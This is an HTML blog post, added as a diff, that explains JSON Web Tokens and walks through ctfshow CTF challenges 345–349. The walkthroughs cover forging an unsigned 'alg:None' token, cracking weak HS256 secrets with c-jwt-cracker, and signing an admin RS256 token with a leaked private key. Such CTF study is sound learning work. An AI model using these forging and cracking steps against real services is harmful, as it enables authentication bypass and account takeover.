@@ -1,0 +1,321 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfshowJWT学习 | cuttlefish</title><meta name="author" content="cuttlefish"><meta name="copyright" content="cuttlefish"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="ctfshow JWT 全网最透彻：JWT Token 到底是什么？原理+结构+流程图+面试考点_jwt token结构-CSDN博客 https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_42030357&#x2F;article&#x2F;details&#x2F;95629924 JWT教程：生成私钥和公钥、生成jwt令牌、验证jwt令牌_学亮编程手记的技术博客_51CTO博客  1.什">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshowJWT学习">
+<meta property="og:url" content="http://example.com/2026/06/01/ctfshow/ctfshowJWT/index.html">
+<meta property="og:site_name" content="cuttlefish">
+<meta property="og:description" content="ctfshow JWT 全网最透彻：JWT Token 到底是什么？原理+结构+流程图+面试考点_jwt token结构-CSDN博客 https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_42030357&#x2F;article&#x2F;details&#x2F;95629924 JWT教程：生成私钥和公钥、生成jwt令牌、验证jwt令牌_学亮编程手记的技术博客_51CTO博客  1.什">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/touxiang.jpg">
+<meta property="article:published_time" content="2026-05-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-01T12:35:02.088Z">
+<meta property="article:author" content="cuttlefish">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/touxiang.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ctfshowJWT学习",
+  "url": "http://example.com/2026/06/01/ctfshow/ctfshowJWT/",
+  "image": "http://example.com/img/touxiang.jpg",
+  "datePublished": "2026-05-31T16:00:00.000Z",
+  "dateModified": "2026-06-01T12:35:02.088Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "cuttlefish",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/06/01/ctfshow/ctfshowJWT/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":true,"top_n_per_article":5,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfshowJWT学习',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/yemian.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">cuttlefish</span></a><a class="nav-page-title" href="/"><span class="site-name">ctfshowJWT学习</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div></div></nav><div id="post-info"><h1 class="post-title">ctfshowJWT学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-05-31T16:00:00.000Z" title="Created 2026-06-01 00:00:00">2026-06-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-06-01T12:35:02.088Z" title="Updated 2026-06-01 20:35:02">2026-06-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow/">ctfshow</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="ctfshow-JWT"><a href="#ctfshow-JWT" class="headerlink" title="ctfshow JWT"></a>ctfshow JWT</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41840843/article/details/159865717">全网最透彻：JWT Token 到底是什么？原理+结构+流程图+面试考点_jwt token结构-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42030357/article/details/95629924">https://blog.csdn.net/weixin_42030357&#x2F;article&#x2F;details&#x2F;95629924</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/zhangxueliang/7054410">JWT教程：生成私钥和公钥、生成jwt令牌、验证jwt令牌_学亮编程手记的技术博客_51CTO博客</a></p>
+</blockquote>
+<h2 id="1-什么是JWT"><a href="#1-什么是JWT" class="headerlink" title="1.什么是JWT"></a>1.什么是JWT</h2><p><strong>JWT</strong> 是 <strong>JSON Web Token</strong> 的缩写，是一种基于 JSON 的开放标准（RFC 7519），用于在网络应用中安全地传输信息。它广泛应用于用户身份验证和授权，尤其在跨域认证场景中非常流行。</p>
+<h3 id="1-1-jwt的组成"><a href="#1-1-jwt的组成" class="headerlink" title="1.1 jwt的组成"></a>1.1 jwt的组成</h3><p>jwt有三部分组成</p>
+<ul>
+<li><strong>Header(头部)</strong>：包含元数据，如签名算法（如 HS256）和令牌类型（JWT）。</li>
+<li><strong>Payload(载荷)</strong>：存储实际传输的数据，例如用户信息和声明（Claims）。声明分为注册声明（如 <em>iss</em>、<em>exp</em>）、公共声明和私有声明。</li>
+<li><strong>Signature（签名）</strong>：通过头部、载荷和密钥生成，用于验证数据完整性，防止篡改。用于校验</li>
+</ul>
+<p>结构为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-jwt的特点"><a href="#1-2-jwt的特点" class="headerlink" title="1.2 jwt的特点"></a>1.2 jwt的特点</h3><ol>
+<li><strong>无状态性</strong>：JWT 是无状态的，所有信息都包含在令牌中，服务端无需存储会话数据，减轻了服务器负担。</li>
+<li><strong>跨平台性</strong>：基于 JSON 格式，支持多种编程语言和平台。</li>
+<li><strong>安全性</strong>：通过签名保证数据完整性，可选加密保护敏感信息。</li>
+<li><strong>扩展性</strong>：支持自定义声明，满足不同业务需求。</li>
+</ol>
+<h3 id="1-3-JWT-认证步骤"><a href="#1-3-JWT-认证步骤" class="headerlink" title="1.3 JWT 认证步骤"></a>1.3 JWT 认证步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户登录或访问-&gt;服务器获取用户信息生成jwt-&gt;服务器把jwt返回给前端-&gt;前端储存jwt-&gt;每次请求带上jwt-&gt;服务器验证jwt-&gt;正确则返回</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-JWT-缺点与注意事项"><a href="#1-4-JWT-缺点与注意事项" class="headerlink" title="1.4 JWT 缺点与注意事项"></a>1.4 JWT 缺点与注意事项</h3><ol>
+<li><strong>Payload 可解码，不能存敏感信息（密码）</strong></li>
+<li><strong>一旦签发，无法中途作废</strong>（除非用黑名单）</li>
+<li><strong>过期时间不能太长</strong>，否则不安全</li>
+<li><strong>密钥 secret 绝对不能泄露</strong></li>
+<li>体积比 SessionId 大，每次请求携带消耗流量</li>
+</ol>
+<h3 id="1-5JWT令牌的生成"><a href="#1-5JWT令牌的生成" class="headerlink" title="1.5JWT令牌的生成"></a>1.5JWT令牌的生成</h3><p>上面说jwt的签名部分是由头部，荷载，和密钥生成，这里还分一个<strong>对称加密</strong>和<strong>非对称加密</strong></p>
+<p><strong>对称加密</strong>如<strong>HS256</strong>就只需要一个密钥，生成令牌与验证都是用这一个密钥</p>
+<p><strong>非对称加密</strong>如<strong>RS256 &#x2F; ES256</strong>用到两个密钥，一个私钥一个公钥，私钥用来生成令牌，而公钥用来验证令牌，企业多使用<strong>非对称加密</strong>，而私钥是绝对保密的</p>
+<h2 id="2-ctfshow"><a href="#2-ctfshow" class="headerlink" title="2.ctfshow"></a>2.ctfshow</h2><h3 id="ctfshow345"><a href="#ctfshow345" class="headerlink" title="ctfshow345"></a>ctfshow345</h3><p>题目进去只有一个页面，f12看一下，有一个admin的路由 有cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3ODAwNTQ3NTAsImV4cCI6MTc4MDA2MTk1MCwibmJmIjoxNzgwMDU0NzUwLCJzdWIiOiJ1c2VyIiwianRpIjoiODc2NWNhZjM2MTFlYTY2OTNjNTI1YjIxNzAyNDRlYWYifV0</span><br></pre></td></tr></table></figure>
+
+<p>解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1780054750,&quot;exp&quot;:1780061950,&quot;nbf&quot;:1780054750,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;8765caf3611ea6693c525b2170244eaf&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+<p>alg就是说明是什么加密算法，typ是token类型固定jwt，这第一个部分就是Header</p>
+<p>第二部分就是Payload</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>全称</th>
+<th>含义</th>
+<th>你的示例值说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>iss</strong></td>
+<td>Issuer</td>
+<td>令牌签发者</td>
+<td><code>admin</code>：表示这个令牌是由名为 “admin” 的服务 &#x2F; 系统签发的</td>
+</tr>
+<tr>
+<td><strong>iat</strong></td>
+<td>Issued At</td>
+<td>令牌签发时间</td>
+<td><code>1780054750</code>：Unix 时间戳，对应北京时间 <strong>2026-05-28 19:39:10</strong></td>
+</tr>
+<tr>
+<td><strong>exp</strong></td>
+<td>Expiration Time</td>
+<td>令牌过期时间</td>
+<td><code>1780061950</code>：Unix 时间戳，对应北京时间 <strong>2026-05-28 21:39:10</strong></td>
+</tr>
+<tr>
+<td><strong>nbf</strong></td>
+<td>Not Before</td>
+<td>令牌生效时间</td>
+<td><code>1780054750</code>：表示令牌从签发时刻立即生效</td>
+</tr>
+<tr>
+<td><strong>sub</strong></td>
+<td>Subject</td>
+<td>令牌主题</td>
+<td><code>user</code>：表示这个令牌是颁发给普通用户的</td>
+</tr>
+<tr>
+<td><strong>jti</strong></td>
+<td>JWT ID</td>
+<td>JWT 唯一标识符</td>
+<td><code>8765caf3611ea6693c525b2170244eaf</code>：用于唯一标识这个 JWT 令牌</td>
+</tr>
+</tbody></table>
+<p>那这题没有算法所以没有密钥也没有签名</p>
+<p>这题只要把sub改成admin就可以了</p>
+<h3 id="ctfshow346"><a href="#ctfshow346" class="headerlink" title="ctfshow346"></a>ctfshow346</h3><p>cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc4MDA1NTQ1OCwiZXhwIjoxNzgwMDYyNjU4LCJuYmYiOjE3ODAwNTU0NTgsInN1YiI6InVzZXIiLCJqdGkiOiJlMTZkZWRiNmJkOTc0ZDg5YTAyMDJjZWYyZmMyZWM2NSJ9.GPpvWuJLI4Us1D0jCUA8bpNQ1JuFTyc9kd7mUJd0I70</span><br></pre></td></tr></table></figure>
+
+<p>解码后</p>
+<p><strong>头部 (Header)</strong></p>
+<table>
+<thead>
+<tr>
+<th>alg (Algorithm)</th>
+<th>HS256</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>typ</td>
+<td>JWT</td>
+</tr>
+</tbody></table>
+<p><strong>载荷 (Payload)</strong></p>
+<table>
+<thead>
+<tr>
+<th>iss</th>
+<th>admin</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>iat (Issued At)</td>
+<td>1780055458 (2026-05-29 19:50:58)</td>
+</tr>
+<tr>
+<td>exp (Expiration Time)</td>
+<td>1780062658 (2026-05-29 21:50:58)</td>
+</tr>
+<tr>
+<td>nbf</td>
+<td>1780055458</td>
+</tr>
+<tr>
+<td>sub (Subject)</td>
+<td>user</td>
+</tr>
+<tr>
+<td>jti</td>
+<td>e16dedb6bd974d89a0202cef2fc2ec65</td>
+</tr>
+</tbody></table>
+<p>这里的密钥是123456，把sub改成admin就好</p>
+<h3 id="ctfshow347"><a href="#ctfshow347" class="headerlink" title="ctfshow347"></a>ctfshow347</h3><p>一个jwt爆破工具<strong>jwt-cracker</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker.git">https://github.com/brendan-rius/c-jwt-cracker.git</a></p>
+<p>使用方法</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t jwtcrack <span class="comment">#创建本地镜像</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it --<span class="built_in">rm</span> jwtcrack &lt;TOKEN&gt; [alphabet] [max_len] [hmac_alg]</span></span><br></pre></td></tr></table></figure>
+
+<p>第一个参数是爆破token,第二个是可以添加表，第三个是最长长度，第四个是算法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc4MDIzNjgyMiwiZXhwIjoxNzgwMjQ0MDIyLCJuYmYiOjE3ODAyMzY4MjIsInN1YiI6InVzZXIiLCJqdGkiOiI2ZGEwMDgzMGQwOTc3MjZlYjU4NzFhMTQxN2NhNDY5YiJ9.g9z_VbtfR2JhjkzG2FJe2TEUjOIbk0YNkKKFF5-kLHs 0123456789 7 sha256</span><br><span class="line">Secret is &quot;123456&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这题密钥是123456</p>
+<h3 id="ctfshow348"><a href="#ctfshow348" class="headerlink" title="ctfshow348"></a>ctfshow348</h3><p>一样的思路</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\tool\jwtcracker\c-jwt-cracker-master&gt; docker run -it --rm jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc4MDIzNzkwMCwiZXhwIjoxNzgwMjQ1MTAwLCJuYmYiOjE3ODAyMzc5MDAsInN1YiI6InVzZXIiLCJqdGkiOiIxNTEzNTZjN2U2NDdjNzdkZjdjZDllODFlOTVhZmRjZSJ9.KcDOAfDnDoI8YGwTwbGjwnF1gOSlP2Rlf-pPwve15fA zxcvbnmasdfghjklqwert0123456789 7 sha256</span><br><span class="line">Secret is &quot;aaab&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ctfshow349"><a href="#ctfshow349" class="headerlink" title="ctfshow349"></a>ctfshow349</h3><p>附件一个app.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>那我们直接访问private.key就可以获得私钥，写一个脚本生成token</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">jwt</span></span><br><span class="line"></span><br><span class="line"><span class="variable">privat_key</span> <span class="operator">=</span> <span class="string">&quot;private(1).key&quot;</span></span><br><span class="line"></span><br><span class="line">with <span class="title function_">open</span><span class="params">(privat_key, <span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)</span> as f:</span><br><span class="line">    private_key = f.read()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1780315422</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, private_key, algorithm=<span class="string">&quot;RS256&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ctfshow350"><a href="#ctfshow350" class="headerlink" title="ctfshow350"></a>ctfshow350</h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">cuttlefish</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/06/01/ctfshow/ctfshowJWT/">http://example.com/2026/06/01/ctfshow/ctfshowJWT/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/touxiang.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/05/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="java反序列化基础"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">java反序列化基础</div></div><div class="info-2"><div class="info-item-1">java反序列化基础 参考文章 (15 封私信 &#x2F; 12 条消息) 大白话说Java反射：入门、使用、原理 - 知乎 (15 封私信 &#x2F; 14 条消息) Java反序列化安全漏洞怎么回事? - 知乎 Java反序列化基础 | root@wanth3f1ag java序列化与反序列化全讲解_反序列化会进无参构造吗-CSDN博客  1.java反序列化java序列化是把java对象转换成字节序列的过程，用来储存数据，字节数据可以储存在文件或内存中。 java反序列化就是通过字节数据恢复储存的对象。 2.实现方法序列化：ObjectOutputStream类中的writeObject()方法 反序列化：ObjectInputStream类中的readObject()方法 举一个列子 1234567891011121314151617181920212223242526272829303132333435363738import java.io.Serializable;public class Testclass implements Serializable /*...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cuttlefish</div><div class="author-info-description">遇事不决，可问春风，春风不语，即随本心。</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cuttlefish520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到我的博客！在这里，我将分享我的技术心得、学习笔记和生活点滴。希望我的博客能为你提供有价值的信息和启发。如果你喜欢我的内容，请随时关注和留言交流！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-JWT"><span class="toc-number">1.</span> <span class="toc-text">ctfshow JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFJWT"><span class="toc-number">1.1.</span> <span class="toc-text">1.什么是JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-jwt%E7%9A%84%E7%BB%84%E6%88%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 jwt的组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-jwt%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 jwt的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-JWT-%E8%AE%A4%E8%AF%81%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.3 JWT 认证步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-JWT-%E7%BC%BA%E7%82%B9%E4%B8%8E%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.1.4.</span> <span class="toc-text">1.4 JWT 缺点与注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5JWT%E4%BB%A4%E7%89%8C%E7%9A%84%E7%94%9F%E6%88%90"><span class="toc-number">1.1.5.</span> <span class="toc-text">1.5JWT令牌的生成</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ctfshow"><span class="toc-number">1.2.</span> <span class="toc-text">2.ctfshow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow345"><span class="toc-number">1.2.1.</span> <span class="toc-text">ctfshow345</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow346"><span class="toc-number">1.2.2.</span> <span class="toc-text">ctfshow346</span></a></li><li class="toc-item toc-level-3"><a 